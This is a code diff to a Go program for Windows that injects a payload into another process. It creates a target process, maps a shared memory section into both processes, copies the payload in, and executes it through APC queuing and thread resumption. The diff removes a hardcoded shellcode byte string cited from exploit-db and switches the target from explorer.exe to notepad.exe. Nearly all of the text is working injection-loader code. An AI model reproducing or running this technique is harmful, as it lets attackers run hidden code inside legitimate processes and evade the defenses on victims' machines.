@@ -7,12 +7,9 @@ import (
 	p "RaGodahn/pslistwin"
 	"flag"
 	"fmt"
-	"log"
 	"os"
-	"path/filepath"
 	"slices"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -50,80 +47,41 @@ func getProcess() windows.Handle {
 
 }
 
-func PE() {
+func PE(path string) {
 	var err error
-	var targetProc string = "explorer.exe"
-	ntdll, err := syscall.LoadLibrary("ntdll.dll")
-	if err != nil {
-		log.Fatalln(err)
-	}
+	var target string = path
+	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
 	defer syscall.FreeLibrary(ntdll)
-	kernel32, err := syscall.LoadLibrary("kernel32.dll")
-	if err != nil {
-		log.Fatalln(err)
-	}
+
+	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
 	defer syscall.FreeLibrary(kernel32)
-	isSysWow64, err := e.IsSysWow64(ntdll)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	systemRoot := filepath.VolumeName(os.Getenv("SYSTEMROOT")) + "\\"
-	if isSysWow64 {
-		log.Println("Is 32bit")
-		targetProc = fmt.Sprintf("%sWindows\\SysWOW64\\%s", systemRoot, targetProc)
-	} else {
-		log.Println("Is 64bit")
-		targetProc = fmt.Sprintf("%sWindows\\System32\\%s", systemRoot, targetProc)
-	}
 
-	procHandle, threadHandle, err := e.CreateProcessInt(kernel32, targetProc)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	section, err := e.CreateNewSection(ntdll)
-	if err != nil {
-		log.Fatalln(err)
-	}
+	procHandle, threadHandle, _ := e.CreateProcessInt(kernel32, target)
 
-	var testSize uint32 = 512
-	//testBuff := []byte("HELLO WORLD!")
-	// REF: https://www.exploit-db.com/exploits/28996
-	shellcodeBuff := []byte("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" +
-		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03" +
-		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b" +
-		"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e" +
-		"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c" +
-		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6f\x72" +
-		"\x6e\x01\x68\x55\x6e\x69\x63\x68\x20\x4d\x61\x6c\x89\xe1\xfe" +
-		"\x49\x0b\x31\xc0\x51\x50\xff\xd7")
-	// Local map section
+	section, _ := e.CreateNewSection(ntdll)
+
+	var size uint32 = 512
+
 	curHandle := uintptr(windows.CurrentProcess())
-	localBaseAddr, _, err := e.MapViewOfSection(ntdll, section, curHandle, testSize, 0)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	// write to current baseAddr
-	log.Printf("MapViewOfSection SUCCESS")
-	e.Memcpy(localBaseAddr, unsafe.Pointer(&shellcodeBuff[0]), len(shellcodeBuff))
-	// Remote map section
-	remoteBaseAddr, _, err := e.MapViewOfSection(ntdll, section, procHandle, testSize, 0)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	log.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)
+	localBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, curHandle, size, 0)
 
-	time.Sleep(2 * time.Second)
+	fmt.Printf("mapViewOfSection réussie")
+	e.Memcpy(localBaseAddr, unsafe.Pointer(&payload[0]), len(payload))
+
+	remoteBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, procHandle, size, 0)
+	fmt.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)
+
 	err = e.QueueApcThread(ntdll, threadHandle, remoteBaseAddr)
 	if err != nil {
-		log.Fatalln(err)
+		fmt.Println(err)
 	}
 	err = e.SetInformationThread(ntdll, threadHandle)
 	if err != nil {
-		log.Fatalln(err)
+		fmt.Println(err)
 	}
 	err = e.ResumeThread(ntdll, threadHandle)
 	if err != nil {
-		log.Fatalln(err)
+		fmt.Println(err)
 	}
 }
 
@@ -154,7 +112,7 @@ func main() {
 
 	switch mode {
 	case "PE":
-		PE()
+		PE("C:\\Windows\\System32\\notepad.exe")
 		break
 	case "Process-auto":
 		processAuto()
